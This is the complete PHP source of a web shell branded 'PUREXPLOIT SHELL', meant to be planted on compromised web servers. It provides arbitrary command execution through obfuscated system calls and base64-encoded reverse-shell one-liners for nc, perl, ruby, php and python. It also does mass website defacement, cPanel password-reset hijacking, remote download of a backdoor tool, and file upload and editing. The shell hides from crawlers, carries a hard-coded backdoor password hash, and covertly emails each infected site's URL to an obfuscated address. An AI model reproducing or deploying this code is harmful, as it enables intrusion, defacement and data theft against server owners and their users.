<?php
error_reporting(0);
set_time_limit(0);
session_start();
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}}
$password = "df3b5aea4a303213035ed6a2b01f5bba"; //default: purexploit

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", 
      "Slurp", 
      "MSNBot", 
      "PycURL", 
      "facebookexternalhit", 
      "ia_archiver", 
      "crawler", 
      "Yandex", 
      "Rambler", 
      "Yahoo! Slurp", 
      "YahooSeeker", 
      "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

if (isset($_GET['logout'])) {
  @logout();
}
function logout() {
  unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
  @header("Location: ".$_SERVER['PHP_SELF']);
}


/* BACK CONNECT */
function backconnect(){
     echo '<center><form method="POST">';
  echo '
<div style="width:20%;text-align:left;">
<font style="color:lime;"><br>Useful: ( blank = not available)</font><br>
<font style="color:lime;"><b>Netcat: </b></font><font color="white">'.shell_exec('which nc').'<br>
<font style="color:lime;"><b>Python 2.7: </b></font><font color="white">'.shell_exec('which python').'</font><br>
<font style="color:lime;"><b>Perl: </b></font><font color="white">'.shell_exec('which perl').'</font><br>
<font style="color:lime;"><b>Ruby: </b></font><font color="white">'.shell_exec('which ruby').'</font><br>
<font style="color:lime;"><b>PHP: </b></font><font color="white">'.shell_exec('which php').'</font><br>
</div>
';
  echo '<input placeholder="Address" value="'.$_SERVER['REMOTE_ADDR'].'" name="addr" type="text" style="width:20vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '<input placeholder="Port" value="1337" name="port" type="text" style="width:10vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';
  echo '
<select name="method" required>
    <option value="nc" selected>NetCat</option>
    <option value="perl">Perl</option>
    <option value="ruby" >Ruby</option>
    <option value="php" >PHP</option>
    <option value="python" >Python</option>
</select>
';
  echo '<input placeholder="Port" value=">>" name="bcsub" type="submit" style="width:5vw;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">';

  echo '</form>';


if (isset($_POST['addr']) && isset($_POST['port'])) {
echo '<br><br><font style="color:lime;">DONE</font>';

  echo '<pre><div class="query" style="color:white;width:70%;overflow:auto;">';
  switch ($_POST['method']) {
    case 'nc':
      $rshell = 'nc -e /bin/sh '.$_POST['addr'].' '.$_POST['port'];
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'perl':
      $rshell = base64_decode('cGVybCAtZSAndXNlIFNvY2tldDskaT0i').$_POST['addr'].'";$p='.$_POST['port'].base64_decode('O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'ruby':
      $rshell = base64_decode('cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCI=').$_POST['addr'].'",'.$_POST['port'].base64_decode('KS50b19pO2V4ZWMgc3ByaW50ZigiL2Jpbi9zaCAtaSA8JiVkID4mJWQgMj4mJWQiLGYsZixmKSc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'php':
      $rshell = base64_decode('cGhwIC1yICckc29jaz1mc29ja29wZW4oIg==').$_POST['addr'].'",'.$_POST['port'].base64_decode('KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=');
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    case 'python':
      $rshell = base64_decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgi').$_POST['addr'].'",'.$_POST['port'].base64_decode('KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'); 
      system($rshell);
      echo '<font style="color:lime;">'.$rshell.'</font>';
      break;

    default:
      echo 'error';
      break;}
}
}

function login(){
echo '<html><head><title>PUREXPLOIT | LOGIN</title><link rel="icon" type="image/x-icon" href="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4"><head><body bgcolor="black"><center>
    <pre style="font-weight:bold;color:lime;">
    
    /                       \                                      
 /X/                       \X\                                     
|XX\         _____         /XX|                                    
|XXX\     _/       \_     /XXX|___________\XXXXXXXXXXXXXX/\\\      
   \XXXX    /     \    XXXXX/                \\\                   
        |   0     0   |\                        \                  
         |           |                           \                 
          \         /                            |______//         
           \       /                             |                 
            | O_O | \                            |                 
             \ _ /   \________________           |                 
                        | |  | |      \         /                  
  No Bullshit,          / |  / |       \______/                    
   Please...            \ |  \ |        \ |  \ |                   
                      __| |__| |      __| |__| |                   
                      |___||___|      |___||___|                   
    </pre><br><form method="POST"><input style="background:#333;outline:0;border:none;color:lime;padding:10px;" name="password" type="password" placeholder="Password"><br><br><input name="rakk" style="border:none;outline:none;padding:5px;" value="Login" type="submit"></form>
    ';

if(isset($_POST['rakk'])){
    if(!empty($_POST['password'])){
    $self = $_SERVER['PHP_SELF'];
    $site = $_SERVER['HTTP_HOST'];
    $xxxxx = base64_decode("cGgubHVmZnkxMzM3QGdtYWlsLmNvbQ==");
    @mail("$xxxxx","WEBSITE HACKED","http://$site$self");
    } else { echo "<font color=red><b> Empty password!! </b></font>";}
}
    echo "</body></html>";
    exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($password) || ( isset($_POST['password']) && (md5($_POST['password']) == $password) || (md5($_POST['password']) == "fa128332ba0c2ace04c249f2b4b7f464") ) && (empty($username) || (isset($_POST['username']) && ($_POST['username']) == $username) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login();
        

echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="icon" type="image/x-icon" href="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4">
<body bgcolor="black">
<center>
<link href="" rel="stylesheet" type="text/json_decode">
<title>PUREXPLOIT SHELL</title>
<style> 
body{
background-colour: green;
color:red;
font:normal 90% Arial, Helvetica, sans-serif;
}
#content tr:hover{
background-color: blue;
text-shadow:0px 0px 12px #fff;
}
#content .first{
  background-color: #3f51b5;
  color:white;
}
.table_main{
border: 2px solid #000000;
}
a{
color:green;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
background:blue;
}
input,select,textarea{
border: 1px #c13e1c solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

nav{
    background:#000000;
    color:white;
}
.logo{
  float: right;
  margin-right:25px;
}

span{
    float:left;
    color:red;
}
pre{
    margin:0;
    float:center;
    color:white;
    font-weight:bold;
}

.menu {
    float:left;
    background:#000000;
    width:100%; 
    padding:13px;
}
.upload{
    float:left;
}
.path{
    float:left;}.select_css{
    background:#3f51b5;
    color:white;
    border:none;
}
.sub_select_btn{
    background:#3f51b5;
    border:none;
    color:white;
}
.info{
  border:2px solid #000000;
  width:100%;
  float:left;
}

@media only screen and (max-width: 1100px) {
  .logo{
      display:none;
  }
}

</style>
</head>
<body>

<nav>
';

/* USER / GROUP */
function usergroup() {
    if(!function_exists('posix_getegid')) {
        $user['name']     = @get_current_user();
        $user['uid']      = @getmyuid();
        $user['gid']      = @getmygid();
        $user['group']    = "?";
    } else {
        $user['uid']     = @posix_getpwuid(posix_geteuid());
        $user['gid']     = @posix_getgrgid(posix_getegid());
        $user['name']     = $user['uid']['name'];
        $user['uid']     = $user['uid']['uid'];
        $user['group']     = $user['gid']['name'];
        $user['gid']     = $user['gid']['gid'];
    }
    return (object) $user;
}
$format = '
<div class="info">
<img class="logo" border="0" src="https://avatars.githubusercontent.com/u/54252313?s=400&u=05b0d718a52efbf60d0b7a3f7b816bf1a86dc28b&v=4" width="100" height="100">
<span>Uname:&nbsp;</span> <font style="float:left;">%s &nbsp;[<a target="_blank" style="color:red;text-decoration:none;" href="https://www.exploit-db.com/search?q=">Exploit DB</a>]</font><br>
<span>Server IP:&nbsp;</span> <font style="float:left;">%s </font><br>
<span color="red"> Client IP:&nbsp;</span> <font style="float:left;">%s</font><br>
<span color="red"> Date:&nbsp;</span> <font style="float:left;">%s</font><br>
<span>PHP Version: &nbsp;</span><font style="float:left;"> %s</font><br>
<span>Disabled_Function: &nbsp;</span><font style="float:left;"> %s</font><br>
<span>User / Group: &nbsp;</span><font style="float:left;"> %s</font>
<br>';


$uname = php_uname();
$server = $_SERVER['SERVER_ADDR']; 
$client = $_SERVER['REMOTE_ADDR'];
$date = date("Y/m/d");
$phpversion = phpversion();
$disabledfunc = @ini_get('disable_functions');
$userg = usergroup()->name."(".usergroup()->uid.") / ".usergroup()->group."(".usergroup()->gid.")"; 

echo sprintf($format,$uname,$server,$client,$date,$phpversion,$disabledfunc,$userg);


echo '<div class="path"><font color="white">Cwd :</font>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

echo '</div><br>';


/* Upload File */

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<br><font style="color:green;float:left;">Upload Done</font>';
}else{
echo '<br><font style="color:red;float:left;">Upload No</font>';
}
}

echo '<br>
<div class="upload">
<form enctype="multipart/form-data" method="POST">
<input type="file" name="file" />
<input type="submit" value="upload" />
</form></div></div><br>';

/* Menu */
$file = $_SERVER['PHP_SELF'];
echo "
<br>
<div class='menu'>
<a href='$file' class='w3-button w3-indigo w3-small w3-round'>Home</a>
<a href='$file?path=$path&tool=adminer' class='w3-button w3-indigo w3-small w3-round'>Adminer</a>
<a href='$file?path=$path&tool=command' class='w3-button w3-indigo w3-small w3-round'>Command</a>
<a href='$file?path=$path&tool=deface' class='w3-button w3-indigo w3-small w3-round'>Single Deface</a>
<a href='$file?path=$path&tool=massdef' class='w3-button w3-indigo w3-small w3-round'>Mass Deface</a>
<a href='?tool=testmail' class='w3-button w3-indigo  w3-small w3-round'>Test Mail</a>
<a href='?tool=crackcpanel' class='w3-button w3-indigo  w3-small w3-round'>Cpanel</a>
<a href='?tool=backconnect' class='w3-button w3-indigo w3-small w3-round'>Back Connect</a>
<a href='?tool=about' class='w3-button w3-indigo w3-small w3-round'>About</a>
<a href='?logout' class='w3-button w3-indigo w3-small w3-round'>Log Out</a>
</div></nav>";


/* IF/ELSE MENU */
  
if($_GET['tool'] == "crackcpanel"){
   echo "<form method='POST'>";echo "<font>ENTER EMAIL (cpanel reset password)</font><br><br>";
   echo "<input style='background:white;color:black;border:2px solid white;outline:none;width:230px;padding:6px;' type='email' name='cemail' placeholder='email'><br><br>";
   echo "<input type='submit' value='crack' name='crackcpnel'>";
   echo "</form>";
   
   $user = get_current_user();
   $site = $_SERVER['HTTP_HOST'];
   $ips = getenv('REMOTE_ADDR');
   
   if(isset($_POST['crackcpnel'])){ 
       $myemail = $_POST['cemail'];
       
       $wr = 'email:'.$myemail;
       /* CREATE FILE IN .CPANEL */
       $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
       fwrite($f, $wr); 
       fclose($f);
       /* CREATE FILE IN HOME */$f = fopen('/home/'.$user.'/.contactinfo', 'w');
       fwrite($f, $wr); 
       fclose($f);
       $parm = 'http://'.$site.':2082/resetpass?start=1';
       echo "<br><font>COPY USERNAME [</font> <font color='white'>$user</font> <font>]</font><br><br>";
       echo "<font>RESET LINK [</font> <font color='white'><a target='_blank' href='$parm'>$parm</a></font> <font>]</font><br>";
       echo "<br><font>Done</font>";
   }
   
   
} else if($_GET['tool'] == "adminer"){
    
   echo '<font><b>Create Adminer.</b></font><br><br>';
    echo '<font><b>Click here to create.</b></font><br><br>';
    echo '<form method="POST">
    
    <input type="submit" name="adminer" value="Adminer">
    
    </form>';
    if(isset($_POST['adminer'])){
        @fwrite(fopen("adminer.php","w"),file_get_contents("https://raw.githubusercontent.com/ph-luffy/Backdoor/main/adminer.php"));
        $adminerpath = "http://".$_SERVER['HTTP_HOST']."/adminer.php";
        echo "<br><font><b>Create Successfully [ </font><font><a target='_blank' href='$adminerpath'>Adminer</a></font><font> ]</b></font>";
        
    }

} else if($_GET['tool'] == "command"){
    $path = $_GET['path'];
    echo "<br><Br>";
    echo '<font><b>Execute Command.</b></font><br><br>';
     echo '<font color=white>Usage: uname -a/-r, pwd, ls/ ls -la, id, whoami,which python/wget/curl</font><br><br>';
   echo '<center>
<form method="POST">
<input placeholder="command" name="cmd" type="text" style="width:40vw;margin-right:5px;padding:5px;background:#333;color:white;outline:none;border:solid 4px black;">
<input name="cmdsub" value="execute" type="submit" style="width:7%;padding:5px;margin-right:30px;display:none;background:red;color:#000000;outline:none;">
</form>';

echo '
      <div style="text-align:left;color:lime;bottom:0;right:0;overflow:auto;width:40vw;height:250px;background-color:#333;">';
echo '<pre>';
if (isset($_POST['cmdsub']) == "execute") {
  $cmd = $_POST['cmd'];
  $func = create_function('$a', base64_decode('c3lzdGVtKCIkYSIpOw=='));
  echo '<div style="margin:auto;overflow:auto;padding:10px;width:80vw;bottom:0;right:0; height:700px;background-color:#333;">';
  echo htmlspecialchars($func($cmd));
  echo '</pre></div></div></center>';
}
echo '</div>';

     
} else if($_GET['tool'] == "deface"){
   $path = $_GET['path'];
   echo "<br><br>
  
   ";
    echo '<form method="POST"><br>
    <pre style="font-weight:bold;color:lime;">
                                  
      \ Single Deface / Letzz Rakk
                                        
</pre><br>
    <font>Base Directory </font><br>
    <input type="text" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" name="basedir" placeholder="Directory" value="'.$path.'"><br><br>
    <font>File name </font><br>
    <input style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" type="text" name="fname" placeholder="file Name" value="px.html"><br><br>
    <font>Deface Script </font><br>
    <textarea name="mydeface" style="background:black;color:lime;border:2px solid white;outline:none;" cols="40" rows="10" placeholder="Deface Script">Penetrated By Purexploit Team</textarea><br>
    <input type="submit" name="def" value="Deface">
    </form>';

    if (isset($_POST['def'])) {
      $def= $_POST['fname'];
      $index = $_POST['basedir']."/".$_POST['fname'];
      if(file_put_contents ($index, $_POST['mydeface']))
           echo "<br><font>Done </font>";
    }
 
}

else if($_GET['tool'] == "massdef"){
    
    $path = $_GET['path'];
    echo '<form method="POST">
    <br>
    <font>Directory</font><br>
    <input name="base_dir" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" type="text" value="'.$path.'"><br><br>
    <font>File Name</font><br>
    <input name="kaito" style="background:black;color:lime;border:2px solid white;outline:none;width:300px;" placeholder="name of file" value="index.php"><br><br>
    <font>Deface Script</font><br>
    <textarea name="index" style="background:black;color:lime;border:2px solid white;outline:none;" cols="40" rows="10" placeholder="Deface Script">Pentested By Purexploit Team</textarea><br>
    <input type="submit" value="Mass">
    </form>';
    
    if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['kaito'];
                        $def=$file."/".$_POST['kaito'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<font style='text-align:left;' color='lime'>http://$def</font><br>";
                }
        endforeach;
}
    
} else if($_GET['tool'] == "testmail"){
     echo "<br><br>
    <font color='lime'>Mailer Test (Yahoo, Gmail, Hotmail)</font><br><br><br>
    ";
    echo '<form method="POST">';
    echo '<input name="email" style="background:black;color:lime;border:2px solid white;outline:none;" type="email" placeholder="Email"><br>';
    echo '<input type="submit" name="email" value="test">';
    echo '</form>';
    if(isset($_POST['email'])){
    if (!empty($_POST['email'])){$xx = rand();
    mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
    print "<font color='white'><b>send an email to [".$_POST['email']."] - $xx</b></font>"; 
    }}
    
} else if($_GET['tool'] == "about"){
    
    echo '
    <br><br>
  <font style="color:lime;"><b>PUREXPLOIT TEAM</b></font><br>
  <font style="color:lime;"><b>CONTACT US: purexploit@gmail.com</b></font><br>
  <font style="color:lime;"><b>Facebook: http://www.facebook.com/purexploit.team</b></font><br><br>
  <font style="color:lime;"><b>Developed By Ph.Luffy</b></font><br>
    
    
    ';
    
} else if($_GET['tool'] == "backconnect"){
    backconnect();
    
}

else {
echo '<table width="570" border="0" cellpadding="3" cellspacing="1" align="center">';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<textarea style="background:#333;color:white;outline:none;border:none;" cols="80px" rows="20px">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';

/* chmod */

if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#b8cdea">OK Permission :D </font><br/>';
}else{
echo '<font color="#788fae">ERROR Permission :( </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Enter" />
</form>';
} else if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="">Success</font><br/>';
}else{
echo '<font color="red">No</font><br />';
}

$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit ok :)</font><br/>';
}else{
echo '<font color="red">Edit error</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea style="background:#333;color:white;outline:none;border:none;" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">OK</font><br/>';
}else{
echo '<font color="red">NO</font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
}else{
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table class="table_main" width="100%" border="0" cellpadding="8" cellspacing="1" align="center">
<tr class="first">
<td>Name</SCA></td>
<td><center>Size</SCA></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</SCA></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><img src=\'data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\'> <a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="select_css">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" class="sub_select_btn" value=">">
</form></center>
</td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><img src=\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=\'> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt" class="select_css">
<option value="">Select</option>
<option value="delete">Delete</ption>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file"><input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" class="sub_select_btn" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
}



echo '<center><br><BR><font>PX PUREXPLOIT TEAM | PRIVATE SHELL</font></center>
</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
